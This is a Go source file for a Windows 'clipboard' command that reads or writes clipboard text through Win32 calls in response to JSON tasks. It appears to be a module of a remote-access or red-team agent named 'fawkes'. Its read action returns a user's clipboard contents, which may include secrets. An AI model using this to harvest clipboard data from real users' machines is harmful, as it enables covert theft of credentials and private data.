//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	user32CB              = windows.NewLazySystemDLL("user32.dll")
	kernel32CB            = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipboard     = user32CB.NewProc("OpenClipboard")
	procCloseClipboard    = user32CB.NewProc("CloseClipboard")
	procGetClipboardData  = user32CB.NewProc("GetClipboardData")
	procSetClipboardData  = user32CB.NewProc("SetClipboardData")
	procEmptyClipboard    = user32CB.NewProc("EmptyClipboard")
	procGlobalAlloc       = kernel32CB.NewProc("GlobalAlloc")
	procGlobalLock        = kernel32CB.NewProc("GlobalLock")
	procGlobalUnlock      = kernel32CB.NewProc("GlobalUnlock")
)

const (
	cfUnicodeText = 13
	gmemMoveable  = 0x0002
)

type ClipboardCommand struct{}

func (c *ClipboardCommand) Name() string {
	return "clipboard"
}

func (c *ClipboardCommand) Description() string {
	return "Read or write Windows clipboard contents"
}

type ClipboardParams struct {
	Action string `json:"action"`
	Data   string `json:"data"`
}

func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
	var params ClipboardParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch params.Action {
	case "read":
		return readClipboard()
	case "write":
		if params.Data == "" {
			return structs.CommandResult{
				Output:    "Error: 'data' parameter is required for write action",
				Status:    "error",
				Completed: true,
			}
		}
		return writeClipboard(params.Data)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'read' or 'write')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func readClipboard() structs.CommandResult {
	// Open clipboard
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	// Get clipboard data as Unicode text
	handle, _, err := procGetClipboardData.Call(cfUnicodeText)
	if handle == 0 {
		return structs.CommandResult{
			Output:    "Clipboard is empty or does not contain text",
			Status:    "success",
			Completed: true,
		}
	}

	// Lock the global memory to get a pointer
	ptr, _, err := procGlobalLock.Call(handle)
	if ptr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock clipboard memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procGlobalUnlock.Call(handle)

	// Read the Unicode string
	text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))

	if text == "" {
		return structs.CommandResult{
			Output:    "Clipboard is empty",
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Clipboard contents (%d chars):\n%s", len(text), text),
		Status:    "success",
		Completed: true,
	}
}

func writeClipboard(text string) structs.CommandResult {
	// Convert to UTF-16
	utf16Text, err := syscall.UTF16FromString(text)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to encode text: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Calculate size in bytes
	size := len(utf16Text) * 2

	// Allocate global memory
	hMem, _, err := procGlobalAlloc.Call(gmemMoveable, uintptr(size))
	if hMem == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to allocate memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Lock the memory
	ptr, _, err := procGlobalLock.Call(hMem)
	if ptr == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to lock memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Copy the UTF-16 data
	src := unsafe.Pointer(&utf16Text[0])
	dst := unsafe.Pointer(ptr)
	copy(
		unsafe.Slice((*byte)(dst), size),
		unsafe.Slice((*byte)(src), size),
	)

	procGlobalUnlock.Call(hMem)

	// Open clipboard
	ret, _, err := procOpenClipboard.Call(0)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseClipboard.Call()

	// Empty the clipboard
	procEmptyClipboard.Call()

	// Set the clipboard data
	ret, _, err = procSetClipboardData.Call(cfUnicodeText, hMem)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to set clipboard data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %d characters to clipboard", len(text)),
		Status:    "success",
		Completed: true,
	}
}
